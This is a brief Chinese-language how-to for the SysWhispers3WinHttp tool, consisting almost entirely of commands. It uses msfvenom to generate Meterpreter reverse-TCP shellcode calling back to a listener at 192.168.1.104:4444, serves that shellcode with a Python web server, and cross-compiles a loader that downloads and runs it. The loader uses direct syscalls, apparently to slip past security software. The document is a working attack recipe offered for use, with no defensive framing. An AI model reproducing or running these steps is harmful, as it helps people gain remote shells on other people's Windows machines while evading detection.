# 工具地址

```
https://github.com/huaigu4ng/SysWhispers3WinHttp
```

生成payload，但是貌似只支持32位
```
// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之Shellcode）
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.104 lport=4444 -f raw -o beacon.bin

// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）
python3 -m http.server

// 3. 修改SysWhispers3WinHttp.c第40行IP地址并使用Linux32位GCC进行交叉编译
i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -fpermissive -w -s -lwinhttp
```